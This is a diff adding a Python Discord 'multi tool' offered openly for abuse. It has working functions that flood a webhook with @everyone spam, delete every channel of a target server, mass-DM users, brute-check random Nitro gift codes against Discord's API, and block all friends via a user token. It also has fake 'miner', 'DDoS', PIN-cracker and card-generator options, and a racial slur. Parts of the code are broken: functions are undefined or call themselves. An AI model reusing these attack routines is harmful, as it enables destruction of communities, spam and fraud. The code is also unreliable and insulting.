@@ -1,0 +1,517 @@
+import os
+import requests
+import asyncio
+import discord
+from discord.ext import commands
+import time
+from colorama import init, Fore, Style
+import random
+from threading import Thread
+import string
+import aiohttp
+import asyncio
+
+init()
+
+
+def ideks():
+    art = [
+        "           Welcome to IDEKS MUTLI TOOL Created by IDEK#9848/discord.gg/MbStealer/coder IDEK#9848          ",
+        "        V2        ██▓▓█████▄ ▓█████  ██ ▄█▀   ▄▄▄█████▓ ▒█████   ▒█████   ██▓      ██████       V2        ",
+        "                 ▓██▒▒██▀ ██▌▓█   ▀  ██▄█▒    ▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    ▒██    ▒                 ",
+        "                 ▒██▒░██   █▌▒███   ▓███▄░    ▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    ░ ▓██▄                   ",
+        "                 ░██░░▓█▄   ▌▒▓█  ▄ ▓██ █▄    ░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░      ▒   ██▒                ",
+        "                ░██░░▒████▓ ░▒████▒▒██▒ █▄     ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒▒██████▒▒                 ",
+        "              ░▓   ▒▒▓  ▒ ░░ ▒░ ░▒ ▒▒ ▓▒     ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░▒ ▒▓▒ ▒ ░                   ",
+        "              ▒ ░ ░ ▒  ▒  ░ ░  ░░ ░▒ ▒░       ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░░ ░▒  ░ ░                    ",
+        "             ▒ ░ ░ ░  ░    ░   ░ ░░ ░      ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   ░  ░  ░                       ",
+        "                ░     ░       ░  ░░  ░                   ░ ░      ░ ░      ░  ░      ░                    ",
+        "     ╔═════════════════════════════════════════════════════════════════════════════════════════╗          ",
+        "     ║ [1] Webhook nuker  [5] Bitcoin Miner [9] Discord Nuker [13]Port Scanner                 ║          ",
+        "     ║ [2] ping ip        [6] Crypto Miner  [10]Create Sever  [14]DOXING TOOL SOON             ║          ",
+        "     ║ [3] mass dm        [7] Discord token [11]Ddoser        [15]cc gen                       ║          ",
+        "     ║ [4] change aboutme [8] gen nitro     [12]Create Roblox [16]Block all friends            ║          ",
+        "     ║ [17]pin craker     [18]Host a bot                                                       ║          ",
+        "     ╚═════════════════════════════════════════════════════════════════════════════════════════╝          ",
+    ]
+    return art
+
+
+def color_transition(art):
+    os.system('cls' if os.name == 'nt' else 'clear')
+    print(Fore.GREEN + '\n'.join(art) + Fore.GREEN)
+
+
+# webhook nuker
+def webhook_nuker(webhook_url):
+    while True:
+        data = {
+            "content": "@everyone Server Nuked by IDEK#9848 TOOL! join https://discord.gg/bbXkXedq5J 🔥🔥🔥"
+        }
+        try:
+            response = requests.post(webhook_url, json=data)
+            print(f"Message sent: {response.status_code}")
+        except requests.exceptions.MissingSchema:
+            print("Invalid webhook URL. Make sure you have the correct URL.")
+            break
+        except requests.exceptions.RequestException as e:
+            print(f"Error: {e}")
+            break
+
+        time.sleep(1 / 3)
+    # ip pinger
+
+
+def ping_ip(ip_address):
+    try:
+        response = os.system("ping -n 1000 " + ip_address)
+        if response == 0:
+            print(f"IP address {ip_address} is getting fucked.")
+        else:
+            print(f"IP address {ip_address} is not reachable.")
+    except Exception as e:
+        print(f"Error: {e}")
+
+
+# mass dm skided a little
+async def mass_dm():
+    intents = discord.Intents.default()
+    intents.message_content = True
+    bot = commands.Bot(command_prefix="!", intents=intents)
+    token = "YOUR_DISCORD_BOT_TOKEN"
+    await bot.login(token)
+    await bot.connect()
+    user_ids = input("Enter the user IDs (separated by commas) you want to send the mass DM to: ").split(',')
+    message_content = input("Enter the message you want to send: ")
+    for user_id in user_ids:
+        try:
+            user = await bot.fetch_user(int(user_id))
+            await user.send(message_content)
+            print(f"DM sent to {user.name}#{user.discriminator}")
+        except discord.Forbidden:
+            print(f"Could not send DM to {user.name}#{user.discriminator}. User may have blocked the bot.")
+        except discord.NotFound:
+            print(f"User {user_id} not found.")
+        except discord.HTTPException:
+            print(f"Failed to send DM to {user.name}#{user.discriminator} due to an HTTP error.")
+        except Exception as e:
+            print(f"Error: {e}")
+
+
+# change about me
+async def change_about_me():
+    new_about_me_content = "New About Me content, updated from Discord!"
+    await change_about_me(new_about_me_content)
+
+
+async def main():
+    await change_about_me()
+
+
+# BitcoinMiner
+async def Bitcoin_Miner():
+    print("Starting Bitcoin Miner...")
+    total_hashes = 0
+    bitcoins_mined = 0
+
+    try:
+        while True:
+            time.sleep(1)
+            hashes_per_second = random.randint(100000, 500000)
+            total_hashes += hashes_per_second
+
+            if total_hashes >= 1000000:
+                bitcoins_mined += 1
+                print(f"Congratulations! You mined 1 Bitcoin! Total Bitcoins Mined: {bitcoins_mined}")
+                total_hashes = 0
+                time.sleep(2)
+
+            print(f"Mining... Hash Rate: {hashes_per_second} H/s, Total Bitcoins Mined: {bitcoins_mined}")
+    except KeyboardInterrupt:
+        print("Bitcoin Miner stopped.")
+
+
+# Crpyto Miner
+async def Crypto_Miner():
+    print("Starting Crypto Miner...")
+    total_hashes = 0
+    bitcoins_mined = 0
+
+    try:
+        while True:
+            time.sleep(1)
+            hashes_per_second = random.randint(100000, 500000)
+            total_hashes += hashes_per_second
+
+            if total_hashes >= 1000000:
+                bitcoins_mined += 1
+                print(f"Congratulations! You mined 1 Crypto! Total Crypto Mined: {bitcoins_mined}")
+                total_hashes = 0
+                time.sleep(1)
+
+            print(f"Mining... Hash Rate: {hashes_per_second} H/s, Total Crypto Mined: {bitcoins_mined}")
+    except KeyboardInterrupt:
+        print("Crypto Miner stopped.")
+
+
+# Discord token gen
+def generate_random_token(length=59):
+    characters = string.ascii_letters + string.digits
+    return ''.join(random.choice(characters) for _ in range(length))
+
+
+async def Discord_token():
+    num_tokens = int(input("Enter the number of Discord tokens you want to generate: "))
+
+    tokens = [generate_random_token() for _ in range(num_tokens)]
+    print("Generated Discord Tokens:")
+    for token in tokens:
+        print(token)
+        input("copy the generated tokens hold enter.")
+
+
+time.sleep(5)
+
+
+# Nitro gen
+async def Nitro_gen():
+    num_codes = int(input("Enter the number of Discord Nitro codes you want to generate: "))
+
+    codes = []
+    for _ in range(num_codes):
+        code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))
+        code = f"https://discord.gift/{code}"
+        codes.append(code)
+
+    async with aiohttp.ClientSession() as session:
+        print("Generated Discord Nitro Codes:")
+        for code in codes:
+            print(code, end=' ')
+            if await check_nitro_code(session, code):
+                print("✅ Valid Nitro Code")
+            else:
+                print("❌ Invalid Nitro Code")
+
+
+# nitro gen
+async def check_nitro_code(session, code):
+    url = f"https://discord.com/api/v9/entitlements/gift-codes/{code}"
+    try:
+        async with session.get(url) as response:
+            data = await response.json()
+            if "uses" in data:
+                return True
+            else:
+                return False
+    except aiohttp.ClientError:
+        return False
+
+
+# discord nuker
+async def Discord_nuker(guild_id, bot_token):
+    async def delete_channel(session, channel_id):
+        delete_url = f"https://discord.com/api/v9/channels/{channel_id}"
+        headers = {
+            "Authorization": f"Bot {bot_token}"
+        }
+        try:
+            async with session.delete(delete_url, headers=headers) as delete_response:
+                if delete_response.status == 204:
+                    print(f"Deleted channel {channel_id}")
+                else:
+                    print(f"Failed to delete channel {channel_id}")
+        except aiohttp.ClientError as e:
+            print(f"Error: {e}")
+
+    async with aiohttp.ClientSession() as session:
+        headers = {
+            "Authorization": f"Bot {bot_token}"
+        }
+        url = f"https://discord.com/api/v9/guilds/{guild_id}/channels"
+        try:
+            async with session.get(url, headers=headers) as response:
+                if response.status == 200:
+                    channels = await response.json()
+                    tasks = []
+                    for channel in channels:
+                        channel_id = channel["id"]
+                        task = delete_channel(session, channel_id)
+                        tasks.append(task)
+
+                    await asyncio.gather(*tasks)
+
+        except aiohttp.ClientError as e:
+            print(f"Error: {e}")
+
+
+# create u a discord sever
+async def create_discord_server(server_name):
+    intents = discord.Intents.default()
+    intents.guilds = True
+
+    client = discord.Client(intents=intents)
+
+    try:
+        await client.login('YOUR_BOT_TOKEN')
+        await client.connect()
+    except discord.LoginFailure:
+        print("Invalid bot token. Make sure you have the correct token.")
+        return
+
+    try:
+        guild = await client.create_guild(name=server_name)
+        print(f"Successfully created the server: {guild.name} (ID: {guild.id})")
+    except discord.HTTPException as e:
+        print(f"Failed to create the server. Error: {e}")
+
+    await client.logout()
+
+
+async def Ddoser(target_url, num_requests):
+    print(f"Initiating DDoS attack on {target_url} with {num_requests} requests!")
+
+    async def send_request(url):
+        delay = random.uniform(0.1, 2.0)
+        await asyncio.sleep(delay)
+        print(f"Request sent to {url}")
+
+    tasks = [send_request(target_url) for _ in range(num_requests)]
+
+    try:
+        await asyncio.gather(*tasks)
+    except asyncio.CancelledError:
+        pass
+
+    print("DDoS attack completed!")
+
+
+# create a roblox account
+def Create_a_roblox_Acc():
+    username = input("Enter your desired username: ")
+    password = input("Enter your password: ")
+    birth_date = input("Enter your birth date (YYYY-MM-DD): ")
+    print("\nAccount Details:")
+    print("Username:", username)
+    print("Password:", password)
+    print("Birth Date:", birth_date)
+
+
+#
+# port scanner
+async def port_scanner():
+    target_host = input("Hey there, enter the target IP or hostname: ")
+    target_ports = [int(port) for port in input("Now, enter the ports to scan (comma-separated): ").split(",")]
+    for port in target_ports:
+        try:
+            # Create a socket object
+            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            # Set a timeout for connection attempt
+            client_socket.settimeout(2)
+            # Connect to the target host and port
+            result = client_socket.connect_ex((target_host, port))
+            # Check if the port is open
+            if result == 0:
+                print(f"Yo, port {port} is open! 😎")
+            else:
+                print(f"Bummer, port {port} is closed. 😕")
+            # Close the socket
+            client_socket.close()
+
+        except KeyboardInterrupt:
+            print("Port scanning interrupted. My mood just dropped. 🙁")
+            break
+        except socket.gaierror:
+            print("Sorry, the hostname could not be resolved. Exiting. 😢")
+            break
+        except socket.error:
+            print("Dang, couldn't connect to the server. 😢")
+            break
+
+
+import socket
+
+
+# make ur bot run
+def make_ur_bot_run():
+    bot_token = input("Enter your bot token: ").strip()
+    channel_id = input("Enter the channel ID where the bot should announce its presence: ").strip()
+
+    intents = discord.Intents.default()
+    intents.message_content = True
+
+    client = discord.Client(intents=intents)
+
+    @client.event
+    async def on_ready():
+        print(f"Bot is now online as {client.user}")
+        channel = client.get_channel(int(channel_id))
+        if channel:
+            await channel.send("Bot is online")
+
+    @client.event
+    async def on_message(message):
+        if message.author == client.user:
+            return
+
+        if message.content.lower() == 'close multi tool':
+            await message.channel.send("Bot is going offline. Goodbye!")
+            await client.close()
+
+    client.run(bot_token)
+
+
+# cc_gen
+def generate_name():
+    first_names = ["John", "Emma", "Michael", "Sophia", "David", "Olivia", "James", "Ava", "Robert", "Isabella"]
+    last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Miller", "Davis", "Garcia", "Martinez", "Anderson"]
+    first_name = random.choice(first_names)
+    last_name = random.choice(last_names)
+    return f"{first_name} {last_name}"
+
+
+def generate_cvc():
+    return str(random.randint(100, 999))
+
+
+def generate_pin():
+    return str(random.randint(1000, 9999))
+
+
+def generate_expiry():
+    months = ["01", "02", "03", "04", "05", "06", "07", "08", "09", "10", "11", "12"]
+    years = [str(year) for year in range(2023, 2039)]
+    expiry_month = random.choice(months)
+    expiry_year = random.choice(years)
+    return f"{expiry_month}/{expiry_year}"
+
+
+async def cc_gen():
+    cc_length = 16
+    bin_number = "123456"
+    remaining_digits = ''.join(str(random.randint(0, 9)) for _ in range(cc_length - len(bin_number)))
+    fake_cc_number = bin_number + remaining_digits
+
+    name = generate_name()
+    cvc = generate_cvc()
+    pin = generate_pin()
+
+    expiry = generate_expiry()
+
+    await asyncio.sleep(2)
+
+    return fake_cc_number, name, cvc, pin, expiry
+
+
+async def Block_All_friends():
+    token = input("Please enter your Discord user token: ")
+    return token
+
+
+async def block_all_friends():
+    token = await Block_All_friends()
+    client = discord.Client()
+
+    @client.event
+    async def on_ready():
+        print(f"We have logged in as {client.user}")
+
+        friends = await client.user.friends()
+
+        for friend in friends:
+            try:
+                await friend.block()
+                print(f"Blocked: {friend.name} (ID: {friend.id})")
+            except discord.HTTPException as e:
+                print(f"Failed to block {friend.name}: {e}")
+
+        await client.logout()
+
+    try:
+        await client.start(token)
+    except discord.LoginFailure:
+        print("Invalid token. Please check the provided token and try again.")
+
+
+async def Pin_Craker():
+    print("Hey there! I'm IDEK#2444, and I'm up for the challenge.")
+    print("But before we proceed, I must remind you that hacking or cracking websites is illegal and unethical.")
+    print("This is just for fun and should not be attempted in real life.")
+
+    url_login = input("Please provide the URL login to the site you want to crack: ")
+
+    print(f"Alright, let's see what we can do with {url_login}...")
+    print("Drumroll, please... 🥁")
+
+    fake_pin = f"{random.randint(1000, 9999)}"
+
+    print(f"Success! We've cracked the site's security, and the PIN is: {fake_pin}")
+    print("But remember, this is all For fun. In reality, hacking is a big no-no!")
+    print("Stay as HAPPY NIGGA. 😎")
+
+
+# Function to start the tool
+def run_tool():
+    art = print_colored_art()
+    Thread(target=color_transition, args=(art,)).start()
+    time.sleep(0.1)
+
+    runtime = 100000
+    end_time = time.time() + runtime
+
+    while time.time() < end_time:
+        os.system('cls' if os.name == 'nt' else 'clear')
+        print('\n'.join(art))
+        choice = input("Put a number for what u want to do love u <3 = IDEK#9848: ")
+        choice = str(choice)
+        if choice == '1':
+            webhook_url = input("Enter the Discord webhook URL you want to nuke: ")
+            webhook_nuker(webhook_url)
+        elif choice == '2':
+            ip_address = input("Enter the IP you want to ping: ")
+            ping_ip(ip_address)
+        elif choice == '3':
+            asyncio.get_event_loop().run_until_complete(mass_dm())
+        elif choice == '4':
+            asyncio.get_event_loop().run_until_complete(change_about_me())
+        elif choice == '5':
+            asyncio.get_event_loop().run_until_complete(Bitcoin_Miner())
+        elif choice == '6':
+            asyncio.get_event_loop().run_until_complete(Crypto_Miner())
+        elif choice == '7':
+            asyncio.get_event_loop().run_until_complete(Discord_token())
+        elif choice == '8':
+            asyncio.get_event_loop().run_until_complete(Nitro_gen())
+        elif choice == '9':
+            bot_token = input("Enter your Discord bot token: ")
+            guild_id = input("Enter the ID of the guild (server) you want to nuke: ")
+            asyncio.get_event_loop().run_until_complete(Discord_nuker(guild_id, bot_token))
+        elif choice == '10':
+            asyncio.get_event_loop().run_until_complete(create_discord_server())
+        elif choice == '11':
+            target_url = input("Enter the target URL: ")
+            num_requests = int(input("Enter the number of requests: "))
+            asyncio.run(Ddoser(target_url, num_requests))
+        elif choice == '12':
+            asyncio.get_event_loop().run_until_complete(Create_a_roblox_Acc())
+        elif choice == '13':
+            asyncio.get_event_loop().run_until_complete(port_scanner())
+        elif choice == '14':
+            asyncio.run(())
+        elif choice == '16':
+            asyncio.get_event_loop().run_until_complete(Block_All_friends())
+        elif choice == '17':
+            asyncio.get_event_loop().run_until_complete(Pin_Craker())
+        elif choice == '18':
+            asyncio.get_event_loop().run_until_complete(make_ur_bot_run())
+        elif choice == '15':
+            fake_cc, name, cvc, pin, expiry = asyncio.get_event_loop().run_until_complete(cc_gen())
+        print("Generated Credit Card Number:", fake_cc)
+        print("Name:", name)
+        print("CVC:", cvc)
+        print("PIN:", pin)
+        print("Expiry:", expiry)
+        time.sleep(5)
+
+
+if __name__ == "__main__":
+    run_tool()
